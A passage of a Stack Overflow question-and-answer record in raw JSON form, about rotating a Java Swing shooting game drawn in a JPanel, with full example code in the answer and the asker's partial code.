CHENIK"},"score":0,"creation_date":1641775631,"post_id":70646590,"comment_id":124887751,"body_markdown":"@MadProgrammer no i tried the code ... the game has a black perfect square in the center of the 800x500 window","body":"@MadProgrammer no i tried the code ... the game has a black perfect square in the center of the 800x500 window"},{"owner":{"account_id":969721,"reputation":344518,"user_id":992484,"accept_rate":60,"display_name":"MadProgrammer"},"score":0,"creation_date":1641775778,"post_id":70646590,"comment_id":124887773,"body_markdown":"@YasserCHENIK Try filling a rect (in the paint component method) with the bounds of the panel AFTER it&#39;s rotated","body":"@YasserCHENIK Try filling a rect (in the paint component method) with the bounds of the panel AFTER it&#39;s rotated"}],"answers":[{"tags":[],"owner":{"account_id":969721,"reputation":344518,"user_id":992484,"accept_rate":60,"display_name":"MadProgrammer"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1641776076,"creation_date":1641775728,"answer_id":70646739,"question_id":70646590,"body_markdown":"The original size of the component is going to be less then 800x500 (I say less then, because the actual size will be 800x500 - the frame decorations - this is why you should be setting the size of the window directly).\r\n\r\nWhen you rotate it 90 degrees, it becomes (less then) 500x800.  So, no, there&#39;s no &quot;easy&quot; way to resolve this, without making the game square.\r\n\r\nI added...\r\n\r\n    g2d.setColor(Color.DARK_GRAY);\r\n    g2d.fillRect(0, 0, getWidth(), getHeight());\r\n\r\nafter the rotation, which highlights the issue.\r\n\r\n[![enter image description here][1]][1]\r\n\r\nTo do this, you should override `getPreferredSize` of the `JPanel` and the call `pack` on the frame.  This will ensure that that game canvas is sized to it&#39;s preferred size and the window decorations are then packed around it.\r\n\r\n    import java.awt.Color;\r\n    import java.awt.Container;\r\n    import java.awt.Dimension;\r\n    import java.awt.Graphics;\r\n    import java.awt.Graphics2D;\r\n    import java.awt.Image;\r\n    import java.awt.event.ActionEvent;\r\n    import java.awt.event.ActionListener;\r\n    import java.awt.event.KeyEvent;\r\n    import java.awt.event.KeyListener;\r\n    import java.awt.event.MouseEvent;\r\n    import java.awt.event.MouseListener;\r\n    import java.awt.event.MouseMotionListener;\r\n    import javax.swing.ImageIcon;\r\n    import javax.swing.JFrame;\r\n    import javax.swing.JPanel;\r\n    import javax.swing.Timer;\r\n\r\n    public class Lec12 extends JFrame {\r\n\r\n        public Lec12() {\r\n            setTitle(&quot;Game Example&quot;);\r\n            setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n            MyJPanel myJPanel = new MyJPanel();\r\n            Container c = getContentPane();\r\n            c.add(myJPanel);\r\n            pack();\r\n            setVisible(true);\r\n        }\r\n\r\n        public static void main(String[] args) {\r\n            new Lec12();\r\n        }\r\n\r\n        public class MyJPanel extends JPanel implements ActionListener, MouseListener,\r\n                MouseMotionListener, KeyListener {\r\n\r\n            //variables for player\r\n            int my_x;\r\n            int player_width, player_height;\r\n\r\n            //variables for enemies\r\n            int enemy_width, enemy_height;\r\n            int n;\r\n            int enemy_x[];\r\n            int enemy_y[];\r\n            int enemy_move[];\r\n            int enemy_alive[];\r\n\r\n            //variables for player&#39;s missiles\r\n            int my_missile_x, my_missile_y;\r\n            int missile_flag;\r\n            public static final int MY_Y = 400;\r\n\r\n            //variables for enemies&#39; missiles\r\n            int e_missile_flag[];\r\n            int e_missile_x[];\r\n            int e_missile_y[];\r\n            int e_missile_move[];\r\n\r\n            Image image, image2;\r\n            Timer timer;\r\n\r\n            public MyJPanel() {\r\n                /**\r\n                 * * initialize player&#39;s info **\r\n                 */\r\n                my_x = 250;\r\n                ImageIcon icon = new ImageIcon(&quot;player.jpg&quot;);\r\n                image = icon.getImage();\r\n\r\n                player_width = image.getWidth(this);\r\n                player_height = image.getHeight(this);\r\n\r\n                missile_flag = 0;\r\n\r\n                /**\r\n                 * * initialize enemies&#39; info **\r\n                 */\r\n                ImageIcon icon2 = new ImageIcon(&quot;enemy.jpg&quot;);\r\n                image2 = icon2.getImage();\r\n                enemy_width = image2.getWidth(this);\r\n                enemy_height = image2.getHeight(this);\r\n\r\n                n = 14; //number of enemies\r\n                enemy_x = new int[n];\r\n                enemy_y = new int[n];\r\n                enemy_move = new int[n];\r\n                enemy_alive = new int[n];\r\n                int distance = 40;\r\n\r\n                e_missile_flag = new int[n];\r\n                e_missile_x = new int[n];\r\n                e_missile_y = new int[n];\r\n                e_missile_move = new int[n];\r\n\r\n                // place enemies in 7x2\r\n                for (int i = 0; i &lt; 7; i++) {\r\n                    enemy_x[i] = (enemy_width + distance) * i + 50;\r\n                    enemy_y[i] = 50;\r\n                }\r\n                for (int i = 7; i &lt; n; i++) {\r\n                    enemy_x[i] = (enemy_width + distance) * (i - 5) + 50;\r\n                    enemy_y[i] = 100;\r\n                }\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    enemy_alive[i] = 1; //all alive\r\n                    enemy_move[i] = -10; //moves to left\r\n                }\r\n\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    e_missile_flag[i] = 0;\r\n                    e_missile_x[i] = 0;\r\n                    e_missile_y[i] = 0;\r\n                    e_missile_move[i] = 7 + n % 3;\r\n                }\r\n\r\n                /**\r\n                 * * setup system **\r\n                 */\r\n                setBackground(Color.black);\r\n                setFocusable(true);\r\n                addMouseListener(this);\r\n                addMouseMotionListener(this);\r\n                addKeyListener(this);\r\n                timer = new Timer(50, this);\r\n                timer.start();\r\n            }\r\n\r\n            @Override\r\n            public Dimension getPreferredSize() {\r\n                return new Dimension(800, 800);\r\n            }\r\n\r\n            private void updateEnemiesPosition() {\r\n                //update enemies&#39; position\r\n                Dimension dim = getSize();\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    enemy_x[i] += enemy_move[i];\r\n                    if ((enemy_x[i] &lt; 0) || (enemy_x[i] &gt; (dim.width - enemy_width))) {\r\n                        enemy_move[i] = -enemy_move[i];\r\n                    }\r\n                }\r\n            }\r\n\r\n            private void updateMyPosition() {\r\n                if (my_x &lt; 0) {\r\n                    my_x = 800;\r\n                }\r\n                if (my_x &gt; 800) {\r\n                    my_x = 0;\r\n                }\r\n            }\r\n\r\n            private void activateMyMissile() {\r\n                //shoot a missile\r\n                if (missile_flag == 0) {\r\n                    my_missile_x = my_x + player_width / 2;\r\n                    my_missile_y = MY_Y; //MY_Y=400\r\n                    missile_flag = 1;\r\n                }\r\n            }\r\n\r\n            private void updateMyMissile() {\r\n                //update missile position if alive\r\n                if (missile_flag == 1) {\r\n                    my_missile_y -= 15;\r\n                    if (0 &gt; my_missile_y) {\r\n                        missile_flag = 0;\r\n                    }\r\n                }\r\n            }\r\n\r\n            private void activateEnemiesMissile() {\r\n                //activate enemies&#39; missile if enemy is alive and its missile is not alive\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (enemy_alive[i] == 1 &amp;&amp; e_missile_flag[i] == 0) {\r\n                        e_missile_x[i] = enemy_x[i] + enemy_width / 2;\r\n                        e_missile_y[i] = enemy_y[i];\r\n                        e_missile_flag[i] = 1;\r\n                    }\r\n                }\r\n            }\r\n\r\n            private void updateEnemiesMissile() {\r\n                //update enemies&#39; missile position if alive\r\n                Dimension dim = getSize();\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (e_missile_flag[i] == 1) {\r\n                        e_missile_y[i] += e_missile_move[i];\r\n                        if (e_missile_y[i] &gt; dim.height) {\r\n                            e_missile_flag[i] = 0;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n\r\n            private void checkHitToEnemy() {\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (missile_flag == 1 &amp;&amp; enemy_alive[i] == 1) {\r\n                        if (my_missile_x &gt; enemy_x[i]\r\n                                &amp;&amp; my_missile_x &lt; (enemy_x[i] + enemy_width)\r\n                                &amp;&amp; my_missile_y &gt; enemy_y[i]\r\n                                &amp;&amp; my_missile_y &lt; (enemy_y[i] + enemy_height)) {\r\n                            //hit\r\n                            missile_flag = 0;\r\n                            enemy_alive[i] = 0;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n\r\n            private boolean checkHitToPlayer() {\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (e_missile_flag[i] == 1) {\r\n                        if (e_missile_x[i] &gt; my_x\r\n                                &amp;&amp; e_missile_x[i] &lt; (my_x + player_width)\r\n                                &amp;&amp; e_missile_y[i] &gt; MY_Y\r\n                                &amp;&amp; e_missile_y[i] &lt; (MY_Y + player_height)) {\r\n                            e_missile_flag[i] = 0;\r\n                            return true;\r\n                        }\r\n                    }\r\n                }\r\n                return false;\r\n            }\r\n\r\n            private boolean checkClear() {\r\n                int cnt = 0;\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (enemy_alive[i] == 0) {\r\n                        cnt++;\r\n                    }\r\n                }\r\n                return (n == cnt);\r\n            }\r\n\r\n            public void paintComponent(Graphics g) {\r\n                super.paintComponent(g); //reset graphics\r\n                Graphics2D g2d = (Graphics2D) g.create();\r\n\r\n                System.out.println(getWidth() + &quot;x&quot; + getHeight());\r\n\r\n                int w2 = getWidth() / 2;\r\n                int h2 = getHeight() / 2;\r\n                g2d.rotate(-Math.PI / 2, w2, h2);\r\n                g2d.setColor(Color.DARK_GRAY);\r\n                g2d.fillRect(0, 0, getWidth(), getHeight());\r\n                //draw player\r\n                g2d.setColor(Color.BLUE);\r\n                g2d.fillRect(my_x, 400, 10, 10);\r\n    //            g.drawImage(image, my_x, 400, this);\r\n                //draw enemies\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (enemy_alive[i] == 1) {\r\n                        g2d.setColor(Color.RED);\r\n                        g2d.fillRect(enemy_x[i], enemy_y[i], 10, 10);\r\n    //                    g.drawImage(image2, enemy_x[i], enemy_y[i], this);\r\n                    }\r\n                }\r\n                //draw players missiles\r\n                if (missile_flag == 1) {\r\n                    g2d.setColor(Color.white);\r\n                    g2d.fillRect(my_missile_x, my_missile_y, 2, 5);\r\n                }\r\n                //draw enemies&#39; missiles\r\n                for (int i = 0; i &lt; n; i++) {\r\n                    if (e_missile_flag[i] == 1) {\r\n                        g2d.setColor(Color.white);\r\n                        g2d.fillRect(e_missile_x[i], e_missile_y[i], 2, 5);\r\n                    }\r\n                }\r\n                g2d.dispose();\r\n            }\r\n\r\n            public void actionPerformed(ActionEvent e) {\r\n                if (e.getSource() == timer) {\r\n                    updateEnemiesPosition();\r\n                    updateMyPosition();\r\n\r\n                    updateMyMissile();\r\n                    updateEnemiesMissile();\r\n\r\n                    activateEnemiesMissile();\r\n\r\n                    if (checkHitToPlayer()) {\r\n                        System.out.println(&quot;===== Game Over =====&quot;);\r\n                        System.exit(0);\r\n                    }\r\n                    checkHitToEnemy();\r\n                    if (checkClear()) {\r\n                        System.out.println(&quot;===== Game Clear =====&quot;);\r\n                        System.exit(0);\r\n                    }\r\n                    repaint();\r\n                }\r\n            }\r\n\r\n            public void mouseClicked(MouseEvent me) {\r\n            }\r\n\r\n            public void mousePressed(MouseEvent me) {\r\n                activateMyMissile();\r\n            }\r\n\r\n            public void mouseReleased(MouseEvent me) {\r\n            }\r\n\r\n            public void mouseExited(MouseEvent me) {\r\n            }\r\n\r\n            public void mouseEntered(MouseEvent me) {\r\n            }\r\n\r\n            public void mouseMoved(MouseEvent me) {\r\n            }\r\n\r\n            public void mouseDragged(MouseEvent me) {\r\n            }\r\n\r\n            public void keyPressed(KeyEvent e) {\r\n                int key = e.getKeyCode();\r\n                switch (key) {\r\n                    case KeyEvent.VK_S:\r\n                        my_x = my_x + 10;\r\n                        break;\r\n                    case KeyEvent.VK_W:\r\n                        my_x = my_x - 10;\r\n                        break;\r\n                    case KeyEvent.VK_DOWN:\r\n                        my_x = my_x + 10;\r\n                        break;\r\n                    case KeyEvent.VK_UP:\r\n                        my_x = my_x - 10;\r\n                        break;\r\n                    case KeyEvent.VK_X:\r\n                        if (missile_flag == 0) {\r\n                            my_missile_x = my_x + player_width / 2;\r\n                            my_missile_y = MY_Y;// MY_Y=400\r\n                            missile_flag = 1;\r\n                        }\r\n                        break;\r\n                }\r\n            }\r\n\r\n            public void keyReleased(KeyEvent e) {\r\n            }\r\n\r\n            public void keyTyped(KeyEvent e) {\r\n            }\r\n        }\r\n    }\r\n\r\nAlso, beware, transformations of this nature are accumulative.  You should, instead, take a snapshot of the `Graphics` context and `dispose` of it once you&#39;re done (see the above for an example).\r\n\r\nAlso, have look at [How to Use Key Bindings](https://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html) as it will help resolve the focus issues related to `KeyListener`\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/QJk40.png","title":"Rotating game in JPanel","body":"<p>The original size of the component is going to be less then 800x500 (I say less then, because the actual size will be 800x500 - the frame decorations - this is why you should be setting the size of the window directly).</p>\n<p>When you rotate it 90 degrees, it becomes (less then) 500x800.  So, no, there's no &quot;easy&quot; way to resolve this, without making the game square.</p>\n<p>I added...</p>\n<pre><code>g2d.setColor(Color.DARK_GRAY);\ng2d.fillRect(0, 0, getWidth(), getHeight());\n</code></pre>\n<p>after the rotation, which highlights the issue.</p>\n<p><a href=\"https://i.stack.imgur.com/QJk40.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/QJk40.png\" alt=\"enter image description here\" /></a></p>\n<p>To do this, you should override <code>getPreferredSize</code> of the <code>JPanel</code> and the call <code>pack</code> on the frame.  This will ensure that that game canvas is sized to it's preferred size and the window decorations are then packed around it.</p>\n<pre><code>import java.awt.Color;\nimport java.awt.Container;\nimport java.awt.Dimension;\nimport java.awt.Graphics;\nimport java.awt.Graphics2D;\nimport java.awt.Image;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport java.awt.event.MouseEvent;\nimport java.awt.event.MouseListener;\nimport java.awt.event.MouseMotionListener;\nimport javax.swing.ImageIcon;\nimport javax.swing.JFrame;\nimport javax.swing.JPanel;\nimport javax.swing.Timer;\n\npublic class Lec12 extends JFrame {\n\n    public Lec12() {\n        setTitle(&quot;Game Example&quot;);\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\n        MyJPanel myJPanel = new MyJPanel();\n        Container c = getContentPane();\n        c.add(myJPanel);\n        pack();\n        setVisible(true);\n    }\n\n    public static void main(String[] args) {\n        new Lec12();\n    }\n\n    public class MyJPanel extends JPanel implements ActionListener, MouseListener,\n            MouseMotionListener, KeyListener {\n\n        //variables for player\n        int my_x;\n        int player_width, player_height;\n\n        //variables for enemies\n        int enemy_width, enemy_height;\n        int n;\n        int enemy_x[];\n        int enemy_y[];\n        int enemy_move[];\n        int enemy_alive[];\n\n        //variables for player's missiles\n        int my_missile_x, my_missile_y;\n        int missile_flag;\n        public static final int MY_Y = 400;\n\n        //variables for enemies' missiles\n        int e_missile_flag[];\n        int e_missile_x[];\n        int e_missile_y[];\n        int e_missile_move[];\n\n        Image image, image2;\n        Timer timer;\n\n        public MyJPanel() {\n            /**\n             * * initialize player's info **\n             */\n            my_x = 250;\n            ImageIcon icon = new ImageIcon(&quot;player.jpg&quot;);\n            image = icon.getImage();\n\n            player_width = image.getWidth(this);\n            player_height = image.getHeight(this);\n\n            missile_flag = 0;\n\n            /**\n             * * initialize enemies' info **\n             */\n            ImageIcon icon2 = new ImageIcon(&quot;enemy.jpg&quot;);\n            image2 = icon2.getImage();\n            enemy_width = image2.getWidth(this);\n            enemy_height = image2.getHeight(this);\n\n            n = 14; //number of enemies\n            enemy_x = new int[n];\n            enemy_y = new int[n];\n            enemy_move = new int[n];\n            enemy_alive = new int[n];\n            int distance = 40;\n\n            e_missile_flag = new int[n];\n            e_missile_x = new int[n];\n            e_missile_y = new int[n];\n            e_missile_move = new int[n];\n\n            // place enemies in 7x2\n            for (int i = 0; i &lt; 7; i++) {\n                enemy_x[i] = (enemy_width + distance) * i + 50;\n                enemy_y[i] = 50;\n            }\n            for (int i = 7; i &lt; n; i++) {\n                enemy_x[i] = (enemy_width + distance) * (i - 5) + 50;\n                enemy_y[i] = 100;\n            }\n            for (int i = 0; i &lt; n; i++) {\n                enemy_alive[i] = 1; //all alive\n                enemy_move[i] = -10; //moves to left\n            }\n\n            for (int i = 0; i &lt; n; i++) {\n                e_missile_flag[i] = 0;\n                e_missile_x[i] = 0;\n                e_missile_y[i] = 0;\n                e_missile_move[i] = 7 + n % 3;\n            }\n\n            /**\n             * * setup system **\n             */\n            setBackground(Color.black);\n            setFocusable(true);\n            addMouseListener(this);\n            addMouseMotionListener(this);\n            addKeyListener(this);\n            timer = new Timer(50, this);\n            timer.start();\n        }\n\n        @Override\n        public Dimension getPreferredSize() {\n            return new Dimension(800, 800);\n        }\n\n        private void updateEnemiesPosition() {\n            //update enemies' position\n            Dimension dim = getSize();\n            for (int i = 0; i &lt; n; i++) {\n                enemy_x[i] += enemy_move[i];\n                if ((enemy_x[i] &lt; 0) || (enemy_x[i] &gt; (dim.width - enemy_width))) {\n                    enemy_move[i] = -enemy_move[i];\n                }\n            }\n        }\n\n        private void updateMyPosition() {\n            if (my_x &lt; 0) {\n                my_x = 800;\n            }\n            if (my_x &gt; 800) {\n                my_x = 0;\n            }\n        }\n\n        private void activateMyMissile() {\n            //shoot a missile\n            if (missile_flag == 0) {\n                my_missile_x = my_x + player_width / 2;\n                my_missile_y = MY_Y; //MY_Y=400\n                missile_flag = 1;\n            }\n        }\n\n        private void updateMyMissile() {\n            //update missile position if alive\n            if (missile_flag == 1) {\n                my_missile_y -= 15;\n                if (0 &gt; my_missile_y) {\n                    missile_flag = 0;\n                }\n            }\n        }\n\n        private void activateEnemiesMissile() {\n            //activate enemies' missile if enemy is alive and its missile is not alive\n            for (int i = 0; i &lt; n; i++) {\n                if (enemy_alive[i] == 1 &amp;&amp; e_missile_flag[i] == 0) {\n                    e_missile_x[i] = enemy_x[i] + enemy_width / 2;\n                    e_missile_y[i] = enemy_y[i];\n                    e_missile_flag[i] = 1;\n                }\n            }\n        }\n\n        private void updateEnemiesMissile() {\n            //update enemies' missile position if alive\n            Dimension dim = getSize();\n            for (int i = 0; i &lt; n; i++) {\n                if (e_missile_flag[i] == 1) {\n                    e_missile_y[i] += e_missile_move[i];\n                    if (e_missile_y[i] &gt; dim.height) {\n                        e_missile_flag[i] = 0;\n                    }\n                }\n            }\n        }\n\n        private void checkHitToEnemy() {\n            for (int i = 0; i &lt; n; i++) {\n                if (missile_flag == 1 &amp;&amp; enemy_alive[i] == 1) {\n                    if (my_missile_x &gt; enemy_x[i]\n                            &amp;&amp; my_missile_x &lt; (enemy_x[i] + enemy_width)\n                            &amp;&amp; my_missile_y &gt; enemy_y[i]\n                            &amp;&amp; my_missile_y &lt; (enemy_y[i] + enemy_height)) {\n                        //hit\n                        missile_flag = 0;\n                        enemy_alive[i] = 0;\n                    }\n                }\n            }\n        }\n\n        private boolean checkHitToPlayer() {\n            for (int i = 0; i &lt; n; i++) {\n                if (e_missile_flag[i] == 1) {\n                    if (e_missile_x[i] &gt; my_x\n                            &amp;&amp; e_missile_x[i] &lt; (my_x + player_width)\n                            &amp;&amp; e_missile_y[i] &gt; MY_Y\n                            &amp;&amp; e_missile_y[i] &lt; (MY_Y + player_height)) {\n                        e_missile_flag[i] = 0;\n                        return true;\n                    }\n                }\n            }\n            return false;\n        }\n\n        private boolean checkClear() {\n            int cnt = 0;\n            for (int i = 0; i &lt; n; i++) {\n                if (enemy_alive[i] == 0) {\n                    cnt++;\n                }\n            }\n            return (n == cnt);\n        }\n\n        public void paintComponent(Graphics g) {\n            super.paintComponent(g); //reset graphics\n            Graphics2D g2d = (Graphics2D) g.create();\n\n            System.out.println(getWidth() + &quot;x&quot; + getHeight());\n\n            int w2 = getWidth() / 2;\n            int h2 = getHeight() / 2;\n            g2d.rotate(-Math.PI / 2, w2, h2);\n            g2d.setColor(Color.DARK_GRAY);\n            g2d.fillRect(0, 0, getWidth(), getHeight());\n            //draw player\n            g2d.setColor(Color.BLUE);\n            g2d.fillRect(my_x, 400, 10, 10);\n//            g.drawImage(image, my_x, 400, this);\n            //draw enemies\n            for (int i = 0; i &lt; n; i++) {\n                if (enemy_alive[i] == 1) {\n                    g2d.setColor(Color.RED);\n                    g2d.fillRect(enemy_x[i], enemy_y[i], 10, 10);\n//                    g.drawImage(image2, enemy_x[i], enemy_y[i], this);\n                }\n            }\n            //draw players missiles\n            if (missile_flag == 1) {\n                g2d.setColor(Color.white);\n                g2d.fillRect(my_missile_x, my_missile_y, 2, 5);\n            }\n            //draw enemies' missiles\n            for (int i = 0; i &lt; n; i++) {\n                if (e_missile_flag[i] == 1) {\n                    g2d.setColor(Color.white);\n                    g2d.fillRect(e_missile_x[i], e_missile_y[i], 2, 5);\n                }\n            }\n            g2d.dispose();\n        }\n\n        public void actionPerformed(ActionEvent e) {\n            if (e.getSource() == timer) {\n                updateEnemiesPosition();\n                updateMyPosition();\n\n                updateMyMissile();\n                updateEnemiesMissile();\n\n                activateEnemiesMissile();\n\n                if (checkHitToPlayer()) {\n                    System.out.println(&quot;===== Game Over =====&quot;);\n                    System.exit(0);\n                }\n                checkHitToEnemy();\n                if (checkClear()) {\n                    System.out.println(&quot;===== Game Clear =====&quot;);\n                    System.exit(0);\n                }\n                repaint();\n            }\n        }\n\n        public void mouseClicked(MouseEvent me) {\n        }\n\n        public void mousePressed(MouseEvent me) {\n            activateMyMissile();\n        }\n\n        public void mouseReleased(MouseEvent me) {\n        }\n\n        public void mouseExited(MouseEvent me) {\n        }\n\n        public void mouseEntered(MouseEvent me) {\n        }\n\n        public void mouseMoved(MouseEvent me) {\n        }\n\n        public void mouseDragged(MouseEvent me) {\n        }\n\n        public void keyPressed(KeyEvent e) {\n            int key = e.getKeyCode();\n            switch (key) {\n                case KeyEvent.VK_S:\n                    my_x = my_x + 10;\n                    break;\n                case KeyEvent.VK_W:\n                    my_x = my_x - 10;\n                    break;\n                case KeyEvent.VK_DOWN:\n                    my_x = my_x + 10;\n                    break;\n                case KeyEvent.VK_UP:\n                    my_x = my_x - 10;\n                    break;\n                case KeyEvent.VK_X:\n                    if (missile_flag == 0) {\n                        my_missile_x = my_x + player_width / 2;\n                        my_missile_y = MY_Y;// MY_Y=400\n                        missile_flag = 1;\n                    }\n                    break;\n            }\n        }\n\n        public void keyReleased(KeyEvent e) {\n        }\n\n        public void keyTyped(KeyEvent e) {\n        }\n    }\n}\n</code></pre>\n<p>Also, beware, transformations of this nature are accumulative.  You should, instead, take a snapshot of the <code>Graphics</code> context and <code>dispose</code> of it once you're done (see the above for an example).</p>\n<p>Also, have look at <a href=\"https://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html\" rel=\"nofollow noreferrer\">How to Use Key Bindings</a> as it will help resolve the focus issues related to <code>KeyListener</code></p>\n"}],"owner":{"account_id":23189519,"reputation":21,"user_id":17286087,"display_name":"user17286087"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":59,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642497258,"creation_date":1641773839,"question_id":70646590,"body_markdown":"I created a very simple shooting game utilizing `JPanel` as shown in the code below. I also wanted to experiment with rotating the game and trying it out. I have one issue, where the game I was able to successfully rotate the game but the dimension seems to cut out, and I have to set each position of the enemy and myself to the rotated position.\r\n\r\nI was wondering if there was a way to rotate the result as a **whole**, instead of simply rotating the shape so that the position of the ship and the missiles would also rotate all at once.\r\n\r\n**Edited code:** added three lives to the player and tried implementing heart image with `BufferedImage`.\r\n\r\n```\r\npublic class game extends JFrame{\r\n\tpublic game(){\r\n\r\n\t}\r\n\tpublic static void main(String[] args){\r\n\t\tnew game();\r\n\t}\r\n\tpublic class MyJPanel extends JPanel implements ActionListener, MouseListener,\r\n\tMouseMotionListener,KeyListener\r\n\t{\r\n\t\t//variables for player\r\n\t\tint my_x;\r\n\t\tint player_width,player_height;\r\n\t\t\r\n        private int lives = 3;\r\n        int heart_width, heart_height;\r\n\t\t//variables for player&#39;s missiles\r\n\t\tint my_missile_x, my_missile_y;\r\n\t\tint missile_flag;\r\n\t\tpublic static final int MY_Y = 600;\r\n\r\n\t\t//variables for enemies&#39; missiles\r\n\t\tint e_missile_flag[];\r\n\t\tint e_missile_x[];\r\n\t\tint e_missile_y[];\r\n\t\tint e_missile_move[];\r\n\r\n\t\tImage image,image2;\r\n\t\tTimer timer;\r\n\r\n        private BufferedImage heart; \r\n        \r\n\t\tpublic MyJPanel(){\r\n\t\t\tmissile_flag = 0;\r\n\r\n\t\t\t/*** initialize enemies&#39; info ***/\r\n\t\t\tImageIcon icon2 = new ImageIcon(&quot;enemy.jpg&quot;);\r\n\t\t\timage2 = icon2.getImage();\r\n\t\t\tenemy_width = image2.getWidth(this);\r\n\t\t\tenemy_height = image2.getHeight(this);\r\n\t\t\t\r\n            try {\r\n            heart = ImageIO.read(getClass().getResource(&quot;heart.jpg&quot;));\r\n            \r\n            }catch(IOException e) {\r\n            }\r\n            heart_width = heart.getWidth(this);\r\n            heart_height = heart.getHeight(this);\r\n\r\n\t\t\tn = 14; //number of enemies\r\n\t\t\tenemy_x = new int[n];\r\n\t\t\tenemy_y = new int[n];\r\n\t\t\tenemy_move = new int[n];\r\n\t\t\tenemy_alive = new int[n];\r\n\t\t\tint distance = 40;\r\n\r\n\t\t\te_missile_flag = new int[n];\r\n\t\t\te_missile_x = new int[n];\r\n\t\t\te_missile_y = new int[n];\r\n\t\t\te_missile_move = new int[n];\r\n\r\n\t\t\t// place enemies in 7x2\r\n\t\t\tfor (int i = 0; i &lt; 7; i++) {\r\n\t\t\t\tenemy_x[i] = (enemy_width + distance) * i + 50;\r\n\t\t\t\tenemy_y[i] = 50;\r\n\t\t\t}\r\n\t\t\tfor (int i = 7; i &lt; n; i++) {\r\n\t\t\t\tenemy_x[i] = (enemy_width + distance) * (i - 5) + 50;\r\n\t\t\t\tenemy_y[i] = 100;\r\n\t\t\t}\r\n\t\t\tfor (int i = 0; i &lt; n; i++) {\r\n\t\t\t\tenemy_alive[i] = 1; //all alive\r\n\t\t\t\tenemy_move[i] = -10; //moves to left\r\n\t\t\t}\r\n\r\n\t\t\tfor (int i = 0; i &lt; n; i++) {\r\n\t\t\t\te_missile_flag[i] = 0;\r\n\t\t\t\te_missile_x[i] = 0;\r\n\t\t\t\te_missile_y[i] = 0;\r\n\t\t\t\te_missile_move[i] = 7 + n%3;\r\n\t\t\t}\r\n\r\n\t\t\t/*** setup system ***/\r\n\t\t\tsetBackground(Color.black);\r\n\t\t\tsetFocusable(true);\r\n\t\t\taddMouseListener(this);\r\n\t\t\taddMouseMotionListener(this);\r\n\t\t\taddKeyListener(this);\r\n\t\t\ttimer = new Timer(50, this);\r\n\t\t\ttimer.start();\r\n\t\t}\r\n\t\t\r\n\t\tprivate void updateEnemiesPosition(){\r\n\t\t\t//update enemies&#39; position\r\n\t\t\tDimension dim = getSize();\r\n\t\t\tfor (int i = 0; i &lt; n; i++) {\r\n\t\t\t\tenemy_x[i] += enemy_move[i];\r\n\t\t\t\tif ((enemy_x[i] &lt; 0) || (enemy_x[i] &gt; (dim.width - enemy_width))) {\r\n\t\t\t\t\tenemy_move[i] = -enemy_move[i];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tprivate void updateMyPosition() {\r\n\t\t\tif(my_x &lt; 0) {\r\n\t\t\t\tmy_x = 800;\r\n\t\t\t}\r\n\t\t\tif(my_x &gt; 800) {\r\n\t\t\t\tmy_x = 0;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tprivate void activateMyMissile(){\r\n\t\t\t//shoot a missile\r\n\t\t\tif(missile_flag == 0){\r\n\t\t\t\tmy_missile_x = my_x + player_width / 2;\r\n\t\t\t\tmy_missile_y = MY_Y; //MY_Y=400\r\n\t\t\t\tmissile_flag = 1;\r\n\t\t\t}\r\n\t\t}\r\n\t\tprivate void updateMyMissile(){\r\n\t\t\t//update missile position if alive\r\n\t\t\tif (missile_flag == 1) {\r\n\t\t\t\tmy_missile_y -= 15;\r\n\t\t\t\tif (0 &gt; my_missile_y) {\r\n\t\t\t\t\tmissile_flag = 0;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tprivate void activateEnemiesMissile(){\r\n\t\t\t//activate enemies&#39; missile if enemy is alive and its missile is not alive\r\n\t\t\tfor(int i = 0; i &lt; n; i++){\r\n\t\t\t\tif (enemy_alive[i] == 1 &amp;&amp; e_missile_flag[i] == 0) {\r\n\t\t\t\t\te_missile_x[i] = enemy_x[i] + enemy_width/2;\r\n\t\t\t\t\te_missile_y[i] = enemy_y[i];\r\n\t\t\t\t\te_missile_flag[i] = 1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tprivate void updateEnemiesMissile(){\r\n\t\t\t//update enemies&#39; missile position if alive\r\n\t\t\tDimension dim = getSize();\r\n\t\t\tfor(int i = 0; i &lt; n; i++){\r\n\t\t\t\tif (e_missile_flag[i] == 1) {\r\n\t\t\t\t\te_missile_y[i] += e_missile_move[i];\r\n\t\t\t\t\tif (e_missile_y[i] &gt; dim.height) {\r\n\t\t\t\t\t\te_missile_flag[i] = 0;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tprivate void checkHitToEnemy(){\r\n\t\t\tfor(int i = 0; i &lt; n; i++){\r\n\t\t\t\tif(missile_flag == 1 &amp;&amp; enemy_alive[i] == 1){\r\n\t\t\t\t\tif(\r\n\t\t\t\t\t\tmy_missile_x &gt; enemy_x[i] &amp;&amp;\r\n\t\t\t\t\t\tmy_missile_x &lt; (enemy_x[i] + enemy_width) &amp;&amp;\r\n\t\t\t\t\t\tmy_missile_y &gt; enemy_y[i] &amp;&amp;\r\n\t\t\t\t\t\tmy_missile_y &lt; 